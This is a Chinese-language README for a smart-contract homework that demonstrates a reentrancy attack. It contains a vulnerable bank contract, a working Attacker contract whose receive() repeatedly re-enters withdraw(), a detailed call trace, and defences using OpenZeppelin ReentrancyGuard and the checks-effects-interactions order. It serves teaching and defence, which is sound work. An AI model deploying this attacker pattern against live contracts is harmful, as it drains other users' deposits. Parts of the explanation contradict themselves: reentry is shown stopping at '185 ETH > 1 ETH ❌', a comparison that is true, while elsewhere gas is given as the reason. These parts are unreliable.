# Homework 6 - 重入攻击演示

## 📚 项目简介

本项目演示了智能合约中的**重入攻击（Reentrancy Attack）**漏洞，这是以太坊历史上最著名的漏洞之一，曾导致 2016 年 The DAO 被盗取价值 6000 万美元的以太币。

## 📁 项目结构

```
lesson-6/1921/
├── contracts/
│   ├── VulnerableBank.sol    # 存在重入漏洞的银行合约
│   ├── Attacker.sol           # 攻击合约
│   └── SafeBank.sol          # 使用 OpenZeppelin 防护的安全合约
├── test/
│   └── ReentrancyAttack.test.js  # 攻击演示测试
└── readme.md
```

---

## 1. 重入攻击（Reentrancy Attack）

### 🐛 漏洞原理

重入攻击的核心问题在于：**合约在更新状态之前就进行了外部调用**。

#### 有漏洞的代码模式：

```solidity
function withdraw(uint256 _amount) public {
    require(balances[msg.sender] >= _amount);  // 1. 检查余额
    
    msg.sender.call{value: _amount}("");       // 2. ⚠️ 发送 ETH（外部调用）
    
    balances[msg.sender] -= _amount;           // 3. ⚠️ 更新余额（太晚了！）
}
```

**问题在哪里？**
- 在第 2 步发送 ETH 时，会触发接收者合约的 `receive()` 或 `fallback()` 函数
- 此时第 3 步还没执行，`balances[msg.sender]` 还没更新
- 攻击者可以在 `receive()` 函数中**再次调用 withdraw()**
- 由于余额还没更新，检查仍然会通过！

### 🎯 攻击流程

#### 时间线演示：

```
初始状态：
  - 银行合约余额：4 ETH (受害者存入)
  - 攻击者存款：1 ETH
  - balances[attacker] = 1 ETH

T1: 攻击者调用 attack()
    → 向银行存入 1 ETH
    → balances[attacker] = 1 ETH
    → 调用 bank.withdraw(1 ETH)

T2: VulnerableBank.withdraw() 第1次执行
    → require(balances[attacker] >= 1 ETH) ✅ 通过 (1 >= 1)
    → 发送 1 ETH 给 attacker
    → 触发 Attacker.receive()
    → ⚠️ balances[attacker] 还是 1 ETH！

T3: Attacker.receive() 被调用
    → attackCount++  (= 1)
    → 检查银行余额 >= 1 ETH？是的！
    → 再次调用 bank.withdraw(1 ETH) ← 重入！

T4: VulnerableBank.withdraw() 第2次执行（重入）
    → require(balances[attacker] >= 1 ETH) ✅ 还是通过！(余额未更新)
    → 再次发送 1 ETH
    → 再次触发 Attacker.receive()
    
T5-Tn: 循环往复...
    → 直到银行 ETH 被掏空！
    → 攻击者用 1 ETH 盗取了所有存款
```

### 🔄 完整调用链图

以下是基于实际测试（300 ETH 存款，119次重入）的完整调用链：

```
用户 (attackerAccount)
    │
    ├─► [1] Attacker.attack() {value: 1 ETH}
    │       │
    │       ├─► [2] VulnerableBank.deposit() {value: 1 ETH}
    │       │       ✅ balances[Attacker] = 1 ETH
    │       │       ✅ 银行余额 = 304 ETH (300 + 3 + 1)
    │       │
    │       └─► [3] VulnerableBank.withdraw(1 ETH)
    │               │
    │               ├─ ✅ require(balances[Attacker] >= 1 ETH)  // 检查通过
    │               │
    │               ├─► [4] msg.sender.call{value: 1 ETH}("")  // 转账给 Attacker
    │               │       │
    │               │       └─► [5] Attacker.receive() 🔥 重入开始！
    │               │               │
    │               │               ├─ attackCount = 1
    │               │               ├─ 检查: bankBalance = 303 ETH > 1 ETH ✅
    │               │               │
    │               │               └─► [6] VulnerableBank.withdraw(1 ETH)  // 🚨 第1次重入！
    │               │                       │
    │               │                       ├─ ✅ require(balances[Attacker] >= 1 ETH)  // 余额仍是1ETH！
    │               │                       │
    │               │                       ├─► [7] msg.sender.call{value: 1 ETH}("")
    │               │                       │       │
    │               │                       │       └─► [8] Attacker.receive() 🔥 第2次重入
    │               │                       │               │
    │               │                       │               ├─ attackCount = 2
    │               │                       │               ├─ 检查: bankBalance = 302 ETH > 1 ETH ✅
    │               │                       │               │
    │               │                       │               └─► [9] VulnerableBank.withdraw(1 ETH)
    │               │                       │                       │
    │               │                       │                       └─► ... 继续递归 ...
    │               │                       │
    │               │                       │               └─► [237] VulnerableBank.withdraw(1 ETH)
    │               │                       │                       │
    │               │                       │                       ├─► [238] msg.sender.call{value: 1 ETH}("")
    │               │                       │                       │       │
    │               │                       │                       │       └─► [239] Attacker.receive() 🔥 第119次重入（最后一次）
    │               │                       │                       │               │
    │               │                       │                       │               ├─ attackCount = 119
    │               │                       │                       │               ├─ 检查: bankBalance = 185 ETH > 1 ETH ❌
    │               │                       │                       │               └─ 🛑 不再调用 withdraw，停止重入
    │               │                       │                       │
    │               │                       │                       └─ unchecked { balances[Attacker] -= 1 ETH }  // 第118次扣除
    │               │                       │                       └─ emit Withdraw
    │               │                       │
    │               │                       └─ unchecked { balances[Attacker] -= 1 ETH }  // 第2次扣除
    │               │                       └─ emit Withdraw
    │               │
    │               └─ unchecked { balances[Attacker] -= 1 ETH }  // 第1次扣除（最外层）
    │               └─ emit Withdraw
    │
    └─ ✅ 攻击完成！攻击者用 1 ETH 盗取了 118 ETH
```

### ⏱️ 关键时间点状态变化

```
时刻 T0: 初始状态
├─ 银行余额: 303 ETH (Victim1: 300 + Victim2: 3)
├─ Attacker 合约余额: 0 ETH
└─ balances[Attacker]: 0 ETH

时刻 T1: Attacker.attack() 存入 1 ETH
├─ 银行余额: 304 ETH
├─ Attacker 合约余额: 0 ETH
└─ balances[Attacker]: 1 ETH

时刻 T2: 第1次 withdraw 开始（外层调用）
├─ 检查通过: balances[Attacker] = 1 ETH >= 1 ETH ✅
├─ 转账: 银行 → Attacker (1 ETH)
├─ 🔥 触发 receive()
└─ ⚠️ balances[Attacker] 尚未更新，仍是 1 ETH！

时刻 T3: 第2次 withdraw（第1次重入）
├─ 检查通过: balances[Attacker] = 1 ETH >= 1 ETH ✅ （余额未更新！）
├─ 转账: 银行 → Attacker (1 ETH)
├─ 🔥 触发 receive()
└─ ⚠️ balances[Attacker] 仍是 1 ETH！

... 重复 119 次 ...

时刻 T120: 第119次 withdraw（第118次重入）
├─ 检查通过: balances[Attacker] = 1 ETH >= 1 ETH ✅
├─ 转账: 银行 → Attacker (1 ETH)
├─ 银行余额降至 185 ETH
├─ 🔥 触发 receive()
├─ 检查: bankBalance = 185 ETH > 1 ETH? ❌ 不满足
└─ 🛑 停止重入，开始回退调用栈

时刻 T121-T239: 调用栈回退（119层）
├─ 每一层执行: unchecked { balances[Attacker] -= 1 ETH }
├─ 由于使用 unchecked，允许下溢
└─ 最终 balances[Attacker] = 1 - 119 = 大负数（下溢后变成巨大正数）

时刻 T240: 攻击完成
├─ 银行余额: 185 ETH
├─ Attacker 合约余额: 119 ETH
├─ attackCount: 119
├─ 攻击者获利: 118 ETH (119 - 1 投入)
└─ 受害者损失: Victim1 损失 115 ETH，Victim2 损失 3 ETH
```

### ⛽ 为什么只能重入 119 次？

**答案：Gas 限制！**

每次重入都要消耗 gas：
1. `withdraw()` 函数调用
2. `require` 检查
3. `call` 转账（触发 `receive`）
4. `receive()` 函数执行
5. `attackCount++` 状态更新
6. `unchecked` 块中的余额更新
7. `Withdraw` 事件发出

**119 次递归调用 ≈ 接近区块 gas 上限**（Hardhat 默认约 30M gas）

```
银行初始: 303 ETH + 攻击者投入: 1 ETH = 304 ETH
攻击后银行: 185 ETH
攻击者获得: 119 ETH
304 - 185 = 119 ✅ 数字完全吻合

受害者损失分析：
├─ Victim1: 存入 300 ETH → 只能取回 185 ETH → 损失 115 ETH ❌
├─ Victim2: 存入 3 ETH → 完全无法取回 → 损失 3 ETH ❌
└─ 总损失: 118 ETH = 攻击者获利
```

### 🎯 核心漏洞：违反 CEI 模式

```solidity
// ❌ 错误的顺序（VulnerableBank.sol）
function withdraw(uint256 _amount) public {
    require(balances[msg.sender] >= _amount);  // 1. Checks ✅
    
    msg.sender.call{value: _amount}("");       // 2. Interactions ❌ 先交互！
    
    balances[msg.sender] -= _amount;           // 3. Effects ❌ 后更新状态！
}

// ✅ 正确的顺序（CEI 模式）
function withdraw(uint256 _amount) public {
    require(balances[msg.sender] >= _amount);  // 1. Checks
    
    balances[msg.sender] -= _amount;           // 2. Effects 先更新状态！
    
    msg.sender.call{value: _amount}("");       // 3. Interactions 后交互！
}
```

**重入攻击利用了状态更新的时间差**：
- ✅ 第1次检查通过（余额 = 1 ETH）
- 💸 转账触发 `receive()`
- 🔥 在余额更新**之前**再次调用 `withdraw()`
- ✅ 第2次检查通过（余额仍是 1 ETH！）
- 🔁 重复 119 次，直到 gas 耗尽或余额不足
- 📉 调用栈回退时才批量更新余额
- 💰 **攻击者用 1 ETH 偷走 118 ETH，获利 11,700%！**

### 💻 攻击合约关键代码

```solidity
contract Attacker {
    VulnerableBank public vulnerableBank;
    uint256 public attackAmount = 1 ether;
    uint256 public attackCount;  // 记录重入次数
    
    function attack() external payable {
        vulnerableBank.deposit{value: attackAmount}();
        vulnerableBank.withdraw(attackAmount);
    }
    
    // 🔥 重入攻击的核心！
    receive() external payable {
        attackCount++;
        
        // 如果银行还有钱，继续攻击
        if (address(vulnerableBank).balance >= attackAmount) {
            vulnerableBank.withdraw(attackAmount);  // 重入！
        }
    }
}
```

**关键点：**
1. `receive()` 函数在接收 ETH 时自动被调用
2. 在这个函数里再次调用 `withdraw()`
3. 因为银行的 `balances` 还没更新，检查会通过
4. 形成递归调用，不断提取 ETH

---

## 2. OpenZeppelin 防护方案

### 🛡️ 防护方法 1：使用 ReentrancyGuard

OpenZeppelin 提供了 `ReentrancyGuard` 合约来防止重入攻击：

```solidity
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract SafeBank is ReentrancyGuard {
    mapping(address => uint256) public balances;
    
    function withdraw(uint256 _amount) public nonReentrant {  // 🔒 使用 nonReentrant 修饰符
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] -= _amount;  // 先更新状态
        
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success);
    }
}
```

**原理：**
- `nonReentrant` 修饰符使用一个状态变量作为"锁"
- 函数开始时检查锁的状态，如果已锁定则 revert
- 函数执行过程中上锁，完成后解锁
- 重入调用会被阻止

### 🛡️ 防护方法 2：CEI 模式（Checks-Effects-Interactions）

遵循正确的代码顺序：

```solidity
function withdraw(uint256 _amount) public {
    // 1. Checks：检查条件
    require(balances[msg.sender] >= _amount);
    
    // 2. Effects：更新状态（在外部调用之前！）
    balances[msg.sender] -= _amount;
    
    // 3. Interactions：外部调用（放在最后）
    (bool success, ) = msg.sender.call{value: _amount}("");
    require(success);
}
```

**为什么这样安全？**
- 即使攻击者在第 3 步重入调用
- 第 2 步已经更新了余额
- 重入调用时 `balances[msg.sender]` 已经是 0
- require 检查会失败！

---

## 3. 运行测试

### 安装依赖

```bash
npm install
```

### 编译合约

```bash
npx hardhat compile
```

### 运行测试

```bash
npx hardhat test
```

### 预期输出

测试会演示：
- 重入攻击发生的次数（`attackCount`）
- 攻击者获取的 ETH 数量
- 受害者无法取回资金

---

## 4. 总结

### 重入攻击的本质

1. **状态更新滞后**：在外部调用之前没有更新状态
2. **递归调用**：外部调用触发攻击者的代码，再次调用目标函数
3. **利用时间差**：在状态更新前反复提取资金

### 防护措施

1. ✅ 使用 OpenZeppelin 的 `ReentrancyGuard`
2. ✅ 遵循 CEI 模式（Checks-Effects-Interactions）
3. ✅ 使用 `transfer()` 或 `send()`（只转发 2300 gas，不够执行复杂逻辑）
4. ✅ 引入互斥锁（mutex）机制

### 历史教训

**The DAO 攻击（2016年）：**
- 攻击者利用重入漏洞盗取 360 万 ETH（当时价值 6000 万美元）
- 导致以太坊硬分叉为 ETH 和 ETC
- 这次事件深刻影响了智能合约安全的发展

---

## 📚 参考资料

- [Solidity Security Considerations - Reentrancy](https://docs.soliditylang.org/en/latest/security-considerations.html#re-entrancy)
- [OpenZeppelin ReentrancyGuard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard)
- [The DAO Hack Explained](https://www.gemini.com/cryptopedia/the-dao-hack-makerdao)
